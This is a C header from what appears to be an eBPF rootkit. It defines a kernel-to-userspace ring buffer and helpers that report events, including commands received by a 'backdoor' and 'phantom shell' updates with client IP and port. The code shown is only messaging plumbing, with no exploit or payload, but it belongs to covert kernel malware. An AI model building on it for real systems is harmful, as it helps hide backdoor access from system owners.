#ifndef __RING_BUFFER_H
#define __RING_BUFFER_H

/*#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>*/
#ifndef __H_TCKIT
#include "headervmlinux.h"
#endif

#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#include "../../../common/map_common.h"

#define RING_BUFFER_MAX_ELEMS 256

/**
 * @brief Ring buffer for general communication kernel->userspace
 * 
 */
struct ring_buffer {
__uint(type, BPF_MAP_TYPE_RINGBUF);
__uint(max_entries, RING_BUFFER_MAX_ELEMS * 1024); //Multiple struct rb_event(s) must fit here
};
struct ring_buffer rb_comm SEC(".maps");

/**
 * @brief Sends an event into the specified ring kernel buffer
 * 
 * @return 0 if ok, -1 if error
 */
static __always_inline int ring_buffer_send(struct ring_buffer *rb, int pid, event_type_t event_type, int code, char* message, __u32 message_len){
    struct rb_event *event = (struct rb_event*) bpf_ringbuf_reserve(rb, sizeof(struct rb_event), 0);
    if(!event){
        return -1;
    }

    event->code = code;
    event->event_type = event_type;
    event->pid = pid;
    bpf_probe_read_kernel_str(&event->message, message_len, message);

	bpf_ringbuf_submit(event, 0);
    return 0;
}

/**
 * @brief Sends an event indicating a received command in the backdoor
 * 
 * @return 0 if ok, -1 if error
 */
static __always_inline int ring_buffer_send_backdoor_command(struct ring_buffer *rb, int pid, int code, __u32 ip, __u16 port){
    struct rb_event *event = (struct rb_event*) bpf_ringbuf_reserve(rb, sizeof(struct rb_event), 0);
    if(!event){
        return -1;
    }

    event->code = code;
    event->event_type = COMMAND;
    event->pid = pid;
    event->client_ip = ip;
    event->client_port = port;

	bpf_ringbuf_submit(event, 0);
    return 0;
}

/**
 * @brief Sends an event indicating a received command in the backdoor
 * 
 * @return 0 if ok, -1 if error
 */
static __always_inline int ring_buffer_send_request_update_phantom_shell(struct ring_buffer *rb, int pid, int code, struct backdoor_phantom_shell_data data){
    struct rb_event *event = (struct rb_event*) bpf_ringbuf_reserve(rb, sizeof(struct rb_event), 0);
    if(!event){
        return -1;
    }

    event->code = code;
    event->event_type = PSH_UPDATE;
    event->pid = pid;
    event->bps_data = data;

	bpf_ringbuf_submit(event, 0);
    return 0;
}
    



#endif